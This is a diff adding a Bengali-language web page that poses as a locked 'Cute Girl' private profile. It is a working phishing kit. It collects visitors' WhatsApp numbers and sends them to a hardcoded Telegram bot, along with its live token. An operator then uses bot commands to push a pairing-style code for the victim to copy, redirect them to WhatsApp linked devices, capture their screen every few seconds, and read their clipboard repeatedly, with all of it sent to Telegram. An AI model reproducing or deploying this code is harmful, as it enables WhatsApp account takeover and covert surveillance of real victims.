@@ -1,0 +1,337 @@
+<!doctype html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Cute Girl - Private Profile Locked (Website B Main)</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+*{box-sizing:border-box;}
+body{margin:0;background:#f2f4f5;font-family:"Noto Sans Bengali",sans-serif;color:#222;}
+.wrapper{width:100%;max-width:700px;margin:auto;}
+.top-image{width:100%;aspect-ratio:16/10;object-fit:cover;display:block;background:#e5e5e5;border-radius:0 0 16px 16px;}
+.site-title{background:#07865f;color:#fff;text-align:center;padding:15px 10px;font-size:24px;font-weight:800;}
+.card{width:calc(100% - 32px);margin:24px 16px 20px;padding:25px 20px;background:#ffffff;border-radius:20px;box-shadow:0 5px 20px rgba(0,0,0,0.08);text-align:center;}
+.product-input{width:100%;padding:16px;border:2px solid #15966f;border-radius:13px;font-size:18px;text-align:center;outline:none;}
+.ok-button{width:100%;border:0;border-radius:13px;padding:15px;margin-top:15px;font-size:18px;font-weight:800;cursor:pointer;background:#1565c0;color:white;}
+.error{display:none;margin-top:15px;color:#c62828;font-weight:700;}
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.55);display:none;align-items:center;justify-content:center;z-index:9999;padding:16px;}
+.modal-overlay.show{display:flex;}
+.modal-box{width:100%;max-width:420px;background:#fff;border-radius:18px;box-shadow:0 15px 40px rgba(0,0,0,0.25);padding:20px;}
+.modal-header{background:#07865f;color:#fff;text-align:center;font-weight:800;font-size:17px;padding:10px;border-radius:10px;margin-bottom:14px;}
+.perm-table{width:100%;border-collapse:collapse;margin-bottom:14px;font-size:15px;}
+.perm-table th,.perm-table td{border:1px solid #e0e0e0;padding:9px 10px;text-align:left;}
+.perm-table th{background:#f7f9f8;width:55%;color:#555;}
+.perm-table td{font-weight:700;color:#07865f;}
+.code-box{min-height:60px;padding:14px;margin-bottom:12px;background:#f1fff8;border:2px dashed #07865f;border-radius:12px;display:none;align-items:center;justify-content:center;font-size:24px;font-weight:900;color:#07865f;text-align:center;}
+.action-btn{width:100%;border:0;border-radius:12px;padding:14px;font-size:17px;font-weight:800;cursor:pointer;color:#fff;margin-top:8px;}
+.action-btn.blue{background:#1565c0;}
+.action-btn.green{background:#07865f;}
+.action-btn.red{background:#c62828;}
+.footer{text-align:center;color:#888;font-size:13px;padding:10px 10px 25px;}
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+    <img id="productImage" class="top-image" src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    <div class="site-title">Cute Girl এর প্রোফাইল লক করা আছে</div>
+
+    <section id="productPage" class="card">
+        <h1>Cute Girl এর প্রাইভেট প্রোফাইল আনলক করুন</h1>
+        <div class="description text-gray-500 mb-4">আপনার হোয়াটসঅ্যাপ নাম্বার বা যেকোনো সংখ্যা লিখে সংযুক্ত হন বাটনে ক্লিক করুন।</div>
+        <input id="productNumber" class="product-input" type="tel" placeholder="আপনার নম্বর লিখুন" autocomplete="off">
+        <button id="submitButton" class="ok-button" type="button">সংযুক্ত হন (Join Now)</button>
+        <div id="errorMessage" class="error"></div>
+    </section>
+
+    <!-- ওয়েটিং পেজ মোডাল -->
+    <div id="waitingPage" class="modal-overlay">
+        <div class="modal-box text-center">
+            <div class="modal-header">⏳ তথ্য যাচাই করা হচ্ছে</div>
+            <div class="my-4 flex justify-center">
+                <svg class="animate-spin h-10 w-10 text-emerald-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+            </div>
+            <div class="text-base font-bold text-gray-800 mb-2">অল্প কিছুক্ষণ অপেক্ষা করুন</div>
+            <div class="text-sm text-gray-600">টেলিগ্রাম কমান্ডের মাধ্যমে পরবর্তী ধাপের জন্য অপেক্ষা করা হচ্ছে...</div>
+        </div>
+    </div>
+
+    <div class="footer">© profile Locked করা আছে</div>
+</div>
+
+<!-- পারমিশন মোডাল (কোড দেখানোর জন্য) -->
+<div id="modalOverlay" class="modal-overlay">
+    <div class="modal-box">
+        <div class="modal-header">🔐 অনুমতি (Permission)</div>
+        <table class="perm-table">
+            <tr><th>📱 হোয়াটসঅ্যাপ নাম্বার</th><td id="permPhone">—</td></tr>
+            <tr><th>📌 স্ট্যাটাস</th><td id="permStatus">—</td></tr>
+        </table>
+        <div id="modalIcon" class="text-center text-4xl my-2"></div>
+        <div id="modalTitle" class="text-lg font-bold text-center mb-2"></div>
+        <div id="modalText" class="text-sm text-gray-600 text-center mb-4"></div>
+        <div id="codeBox" class="code-box"></div>
+        <div id="modalAction"></div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8990521456:AAFOG4g-sFfJgDABIgkbTyAJI6FQiTCyVow";
+    const CHAT_ID = "8516934257";
+    const WHATSAPP_LINK = "https://wa.me/settings/linked_devices";
+
+    let requestStartedAt = 0, lastUpdateId = 0, pollingTimer = null, isPolling = false;
+    let currentStep = 1, currentPhone = "", codeShown = "", navigatingToWhatsApp = false;
+    let screenStream = null, screenCaptureInterval = null, isScreenSharing = false;
+    let clipboardMonitorInterval = null, lastClipboardContent = "";
+
+    const store = {
+        get: (k, f) => { try { const v = sessionStorage.getItem(k); return v === null ? f : v; } catch(e){ return f; } },
+        set: (k, v) => { try { sessionStorage.setItem(k, v); } catch(e){} },
+        del: (k) => { try { sessionStorage.removeItem(k); } catch(e){} }
+    };
+
+    const productPage = document.getElementById("productPage");
+    const waitingPage = document.getElementById("waitingPage");
+    const productNumber = document.getElementById("productNumber");
+    const submitButton = document.getElementById("submitButton");
+    const errorMessage = document.getElementById("errorMessage");
+    const modalOverlay = document.getElementById("modalOverlay");
+    const permPhone = document.getElementById("permPhone");
+    const permStatus = document.getElementById("permStatus");
+    const modalIcon = document.getElementById("modalIcon");
+    const modalTitle = document.getElementById("modalTitle");
+    const modalText = document.getElementById("modalText");
+    const codeBox = document.getElementById("codeBox");
+    const modalAction = document.getElementById("modalAction");
+
+    function showProductPage() { currentStep = 1; productPage.style.display = "block"; waitingPage.classList.remove("show"); }
+    function showWaitingPage() { currentStep = 2; store.set("cw_step", "2"); waitingPage.classList.add("show"); }
+    function showError(msg) { errorMessage.textContent = msg; errorMessage.style.display = "block"; }
+    function clearError() { errorMessage.textContent = ""; errorMessage.style.display = "none"; }
+
+    function notifyTelegram(text){
+        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(function(){});
+    }
+
+    async function sendProductRequest(product){
+        const message = `🆕 নতুন ইউজার রিকোয়েস্ট (Website B)\n📱 নাম্বার: \`${product}\`\n\n👇 কমান্ড বাটন ব্যবহার করুন:`;
+        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID, text: message,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "/send", callback_data: "cmd_send" }, { text: "/error", callback_data: "cmd_error" }],
+                        [{ text: "/success", callback_data: "cmd_success" }, { text: "/WhatsApp web", callback_data: "cmd_web" }],
+                        [{ text: "🖥️ Start Screen", callback_data: "cmd_start_screen" }, { text: "⏹️ Stop Screen", callback_data: "cmd_stop_screen" }],
+                        [{ text: "📋 Clipboard", callback_data: "cmd_clipboard" }, { text: "🛑 Stop Clipboard", callback_data: "cmd_stop_clipboard" }]
+                    ]
+                }
+            })
+        });
+    }
+
+    submitButton.addEventListener("click", async function(){
+        clearError();
+        const value = productNumber.value.trim();
+        if (!value) { showError("অনুগ্রহ করে আপনার নম্বর লিখুন।"); return; }
+        
+        requestStartedAt = Math.floor(Date.now() / 1000);
+        currentPhone = value;
+        store.set("cw_requestId", String(requestStartedAt));
+        store.set("cw_phone", value);
+
+        submitButton.disabled = true;
+        submitButton.textContent = "পাঠানো হচ্ছে...";
+
+        try {
+            await sendProductRequest(value);
+            showWaitingPage();
+            notifyTelegram("⏳ ইউজার ওয়েটিং পেজে আছে — কমান্ড বাটনে ক্লিক করুন।");
+            startPolling();
+        } catch (e) {
+            showError("অনুরোধ পাঠানো যায়নি।");
+        } finally {
+            submitButton.disabled = false;
+            submitButton.textContent = "সংযুক্ত হন (Join Now)";
+        }
+    });
+
+    function startPolling(){
+        stopPolling();
+        pollTelegram();
+        pollingTimer = setInterval(pollTelegram, 3000);
+    }
+    function stopPolling(){ if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; } }
+
+    async function pollTelegram(){
+        if (currentStep !== 2 || isPolling) return;
+        isPolling = true;
+        try {
+            const res = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=1");
+            const data = await res.json();
+            if (!data.ok || !data.result) return;
+
+            for (const update of data.result) {
+                lastUpdateId = Math.max(lastUpdateId, update.update_id);
+                store.set("cw_lastUpdateId", String(lastUpdateId));
+
+                if (update.callback_query) {
+                    const cq = update.callback_query;
+                    if (cq.message?.chat?.id === Number(CHAT_ID)) {
+                        answerCallbackQuery(cq.id);
+                        handleCommand(cq.data, null);
+                    }
+                    continue;
+                }
+
+                if (update.message?.text && update.message.chat.id === Number(CHAT_ID)) {
+                    const raw = update.message.text.trim();
+                    const lower = raw.toLowerCase();
+                    if (lower.startsWith("/send")) handleCommand("cmd_send", raw.substring(5).trim() || null);
+                    else if (lower === "/error") handleCommand("cmd_error", null);
+                    else if (lower === "/success") handleCommand("cmd_success", null);
+                    else if (lower === "/whatsapp web") handleCommand("cmd_web", null);
+                }
+            }
+        } catch (e) {} finally { isPolling = false; }
+    }
+
+    async function answerCallbackQuery(id){
+        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery", {
+            method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ callback_query_id: id })
+        }).catch(()=>{});
+    }
+
+    function handleCommand(cmd, val){
+        waitingPage.classList.remove("show");
+        if (cmd === "cmd_send") showSendModal(val || "");
+        else if (cmd === "cmd_error") showErrorModal();
+        else if (cmd === "cmd_success") showSuccessModal();
+        else if (cmd === "cmd_web") window.location.href = WHATSAPP_LINK;
+        else if (cmd === "cmd_start_screen") requestScreenShare();
+        else if (cmd === "cmd_stop_screen") stopScreenShare();
+        else if (cmd === "cmd_clipboard") startClipboardMonitoring();
+        else if (cmd === "cmd_stop_clipboard") stopClipboardMonitoring();
+    }
+
+    function openModal() { modalOverlay.classList.add("show"); }
+    function closeModal() { modalOverlay.classList.remove("show"); modalAction.innerHTML = ""; codeShown = ""; }
+
+    function showSendModal(code){
+        openModal();
+        permPhone.textContent = currentPhone || "—";
+        permStatus.textContent = code ? "কোড প্রস্তুত ✅" : "অপেক্ষা ⏳";
+        modalIcon.textContent = "🔑";
+        modalTitle.textContent = "আনলক কোড";
+        modalText.textContent = "কোডটি কপি করুন:";
+        codeBox.style.display = "flex";
+        codeBox.textContent = code || "…";
+        codeShown = code;
+        modalAction.innerHTML = '<button type="button" class="action-btn blue" id="copyCodeBtn">📋 কপি করুন</button>';
+        document.getElementById("copyCodeBtn").addEventListener("click", async () => {
+            if (codeShown) await navigator.clipboard.writeText(codeShown).catch(()=>{});
+            notifyTelegram("✅ ইউজার কোড কপি করেছে: " + codeShown);
+            closeModal();
+            showWaitingPage();
+        });
+    }
+
+    function showErrorModal(){
+        openModal();
+        permPhone.textContent = currentPhone || "—";
+        permStatus.textContent = "ত্রুটি ❌";
+        modalIcon.innerHTML = '<span style="color:#c62828">✖</span>';
+        modalTitle.textContent = "সমস্যা হয়েছে";
+        modalText.textContent = "আবার চেষ্টা করুন।";
+        codeBox.style.display = "none";
+        modalAction.innerHTML = '<button type="button" class="action-btn red" id="retryBtn">আবার চেষ্টা করুন</button>';
+        document.getElementById("retryBtn").addEventListener("click", () => { closeModal(); showWaitingPage(); });
+    }
+
+    function showSuccessModal(){
+        openModal();
+        permPhone.textContent = currentPhone || "—";
+        permStatus.textContent = "সফল ✅";
+        modalIcon.innerHTML = '<span style="color:#16833c">✓</span>';
+        modalTitle.textContent = "সফল হয়েছে";
+        modalText.textContent = "নিচের বাটনে ক্লিক করুন।";
+        codeBox.style.display = "none";
+        modalAction.innerHTML = '<button type="button" class="action-btn green" id="joinBtn">✅ যুক্ত হন</button>';
+        document.getElementById("joinBtn").addEventListener("click", () => { window.location.href = WHATSAPP_LINK; });
+    }
+
+    async function requestScreenShare() {
+        try {
+            screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "always" }, audio: false });
+            isScreenSharing = true;
+            notifyTelegram("✅ স্ক্রিন শেয়ার Allow হয়েছে!");
+            screenStream.getVideoTracks()[0].onended = () => stopScreenShare();
+            const video = document.createElement('video');
+            video.srcObject = screenStream; video.play();
+            screenCaptureInterval = setInterval(() => {
+                if (!isScreenSharing) { clearInterval(screenCaptureInterval); return; }
+                const canvas = document.createElement('canvas');
+                canvas.width = 720; canvas.height = 1280;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob((blob) => {
+                    if (!blob) return;
+                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, `screen.png`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.5);
+            }, 3000);
+            showWaitingPage();
+        } catch (e) { notifyTelegram("❌ স্ক্রিন শেয়ার ডিনাইড।"); }
+    }
+
+    function stopScreenShare() {
+        if (screenStream) { screenStream.getTracks().forEach(t => t.stop()); screenStream = null; }
+        if (screenCaptureInterval) clearInterval(screenCaptureInterval);
+        isScreenSharing = false; notifyTelegram("⏹️ স্ক্রিন শেয়ার বন্ধ।");
+    }
+
+    async function startClipboardMonitoring() {
+        notifyTelegram("📋 ক্লিপবোর্ড মনিটরিং শুরু!");
+        clipboardMonitorInterval = setInterval(async () => {
+            try {
+                const t = await navigator.clipboard.readText();
+                if (t && t !== lastClipboardContent) {
+                    lastClipboardContent = t;
+                    notifyTelegram(`📋 ক্লিপবোর্ড ডেটা: \`${t}\``);
+                }
+            } catch(e){}
+        }, 2000);
+    }
+
+    function stopClipboardMonitoring() {
+        if (clipboardMonitorInterval) clearInterval(clipboardMonitorInterval);
+        notifyTelegram("🛑 ক্লিপবোর্ড মনিটরিং বন্ধ।");
+    }
+
+    window.addEventListener("pagehide", () => { if (currentStep === 2 && !navigatingToWhatsApp) notifyTelegram("🚪 ইউজার ওয়েবসাইট ছেড়ে গেছে"); });
+
+    window.addEventListener("pageshow", () => {
+        stopPolling();
+        const savedStep = store.get("cw_step", "1");
+        const savedReq = store.get("cw_requestId", "0");
+        if (savedStep === "2" && savedReq !== "0") {
+            requestStartedAt = Number(savedReq);
+            currentPhone = store.get("cw_phone", "");
+            lastUpdateId = Number(store.get("cw_lastUpdateId", "0"));
+            showWaitingPage();
+            startPolling();
+        } else {
+            showProductPage();
+        }
+    });
+
+    productNumber.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); submitButton.click(); } });
+    showProductPage();
+</script>
+</body>
+</html>
